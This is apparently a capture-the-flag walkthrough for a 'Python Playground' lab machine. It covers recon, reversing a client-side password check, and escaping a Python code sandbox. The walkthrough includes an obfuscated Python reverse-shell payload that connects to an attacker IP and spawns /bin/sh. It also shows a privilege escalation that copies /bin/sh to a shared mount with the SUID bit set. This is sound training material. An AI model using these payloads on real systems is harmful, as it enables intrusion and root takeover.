# Python Playground

Doing nmap scan on the target machine ip, mine is `10.201.101.172`

`nmap -sV MACHINE_IP`

<img width="436" height="116" alt="image" src="https://github.com/user-attachments/assets/50b4bb50-c623-4072-908b-d42299295efc" />

Checking the http page, there is a login and signup page but both have the same message

<img width="597" height="170" alt="image" src="https://github.com/user-attachments/assets/1d474604-6d28-469b-a6d6-580b9a197cc8" />

<img width="485" height="61" alt="image" src="https://github.com/user-attachments/assets/c32ee1f5-3b0a-48ac-ae64-df7b0d3d7d6f" />

Nothing suspicious in these three html pages, so lets do gobuster scan to check other html pages.

`gobuster dir -u http://MACHINE_IP -w /usr/share/dirb/wordlists/common.txt -x html`

<img width="424" height="221" alt="image" src="https://github.com/user-attachments/assets/c7965f67-49da-4fb4-84f3-9dc162c53803" />

Which gives us the result of admin.html, which is Conner's Secret Admin Backdoor

<img width="209" height="154" alt="image" src="https://github.com/user-attachments/assets/f6b6dd81-c2ec-4738-b07b-8830cccdba56" />

At the page source, there is a script which we can analyze to bypass this authentication

```
<script>
      // I suck at server side code, luckily I know how to make things secure without it - Connor

      function string_to_int_array(str){
        const intArr = [];

        for(let i=0;i<str.length;i++){
          const charcode = str.charCodeAt(i);

          const partA = Math.floor(charcode / 26);
          const partB = charcode % 26;

          intArr.push(partA);
          intArr.push(partB);
        }

        return intArr;
      }

      function int_array_to_text(int_array){
        let txt = '';

        for(let i=0;i<int_array.length;i++){
          txt += String.fromCharCode(97 + int_array[i]);
        }

        return txt;
      }

      document.forms[0].onsubmit = function (e){
          e.preventDefault();

          if(document.getElementById('username').value !== 'connor'){
            document.getElementById('fail').style.display = '';
            return false;
          }

          const chosenPass = document.getElementById('inputPassword').value;

          const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

          if(hash === 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'){
            window.location = 'super-secret-admin-testing-panel.html';
          }else {
            document.getElementById('fail').style.display = '';
          }
          return false;
      }
  </script>
```

This JavaScript validates a login entirely in the browser by first checking if the username is "connor", then transforming the entered password through a custom double-encoding process: it converts each character into two numbers based on division and remainder by 26, maps those numbers back to lowercase letters, and repeats this process twice. 

The final transformed string is compared against a hardcoded value (`dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu`), and if it matches, the user is redirected to `super-secret-admin-testing-panel.html`. Because all logic and the “hash” are visible in the source, it’s insecure and can be reversed to find the correct password.

So reversing this algorithm to get the actual password as we know that the username is connor.

```
# Let's reverse the transformation to recover the password
hash_str = "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"

def text_to_int_array(txt):
    return [ord(c) - 97 for c in txt]

def int_array_to_string(int_arr):
    s = ""
    for i in range(0, len(int_arr), 2):
        charcode = int_arr[i] * 26 + int_arr[i + 1]
        s += chr(charcode)
    return s

# Reverse the double transformation
# hash_str = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(password))))
# Step 1: Convert hash_str back to int array
step1_ints = text_to_int_array(hash_str)

# Step 2: Convert that int array back to a string (undo int_array_to_text)
step2_text = int_array_to_string(step1_ints)

# Step 3: Now step2_text is the result of int_array_to_text(string_to_int_array(password))
# Convert step2_text to int array
step3_ints = text_to_int_array(step2_text)

# Step 4: Convert back to the original password
original_password = int_array_to_string(step3_ints)

print(original_password)
```

Creating a file named `reverse_bypass.py`, pasting this code and running this file to get the password

nano reverse_bypass.py

python3 reverse_bypass.py

<img width="300" height="100" alt="image" src="https://github.com/user-attachments/assets/f7ccd29b-13aa-4fa7-840e-44ffe59eb1b2" />

Putting the username and password, we get to the `super-secret-admin-testing-panel.html`. You can get to this page without even bypassing this, as I checked if I can get to this page without bypassing

This is like input and output fields, like when i used `print('OK')`, it gives OK in the output field.

This can be used to put our code to get the reverse shell by putting in a listener in our terminal.

After some trying, there are some restrictions like as simple `import` is not allowed.

The `__import__` is allowed so this can be used to bypass this restriction and get the reverse shell. I tried this one to test this

```
os = __import__("os")
print(os.listdir("."))
```

Start listener in your terminal by `nc -lvnp 4444`

Tried some reverse shell code and got the shell from this python code

```
# Get __import__ without writing 'import'
b = (lambda:0).__globals__['__builtins__']
imp = b['__import__'] if isinstance(b, dict) else getattr(b, '__import__')

# Build module names dynamically
mod1 = ''.join([chr(x) for x in [115,111,99,107,101,116]])   # "socket"
mod2 = ''.join([chr(x) for x in [111,115]])                   # "os"
mod3 = ''.join([chr(x) for x in [112,116,121]])                # "pty"

socket = imp(mod1)
os = imp(mod2)
pty = imp(mod3)

# Reverse shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("YOUR_TUN0_IP", 4444))
for fd in (0,1,2):
    os.dup2(s.fileno(), fd)
pty.spawn('/bin/sh')
```

### Answer the questions below

1. What is flag 1?

We get the root shell and can get the `flag1.txt` in the root directory

<img width="347" height="175" alt="478528645-7f756320-e21f-452d-b90e-0ef0f9ecbe17" src="https://github.com/user-attachments/assets/43bf76b8-1696-4df2-9244-8a00a8d1a4e1" />

As we have already got the username as `connon` and password by reversing the code so connecting to the machine through `ssh`

`ssh connor@MACHINE_IP` and give the password

2. What is flag 2?

You will get the `flag2.txt` in the current directory.

<img width="338" height="272" alt="image" src="https://github.com/user-attachments/assets/51eab2ad-7c97-4655-9584-28c8e710e382" />

After some enumeration through command `mount` and `df -h` i see one file `/mnt/log`.

I see the contents of `auth.log` in this directory so it has all the history of Connors meaning it is linked to the Connor's machine. You can confirm this by checking `ls -l /var/log` in Connor's machine and `ls -l /mnt/log` in root machine, The content is same.

So the flag3.txt purpose would be to use the `/mnt/log` to escalate to the `root` in Connor's machine

Think of it like:
- Flag1.txt → root-level access on Machine A.
- Flag2.txt → user-level access on Machine B (Connor's machine)
- Flag3.txt → root-level access on Machine B (Connor’s machine).

We copy `/bin/sh` into `/mnt/log`, which is mounted to Connor’s `/var/log` directory, so the shell file appears on his machine. Then, we set the SUID permission on it (`chmod +s`) so that when it’s run on Connor’s system, it executes with root privileges. This way, when we access Connor’s machine and run that shell, we get a root shell and can read files like `flag3.txt`.

`chmod +s` sets the SUID (Set User ID) permission bit on a file.

When a file has the SUID bit set and is owned by `root`, anyone who runs that file will temporarily have `root` privileges for the duration of that program.

Doing the following commands in root machine:

`cp /bin/sh /mnt/log` -> Copies the sh shell program into the directory /mnt/log.

`chmod +s /mnt/log/sh` -> Give SUID permission

`ls -l /mnt/log/sh` -> Check that this file has SUID permission

<img width="267" height="86" alt="image" src="https://github.com/user-attachments/assets/168360b1-ba3f-4089-94a6-04efe5069ab5" />

3. What is flag 3?

Now then go to the Connor's machine and execute `/var/log/sh -p` so you then can access the root directory by `cd /root`

<img width="221" height="131" alt="image" src="https://github.com/user-attachments/assets/4c4a5098-90a1-4bd5-8568-c5c13d5d8334" />























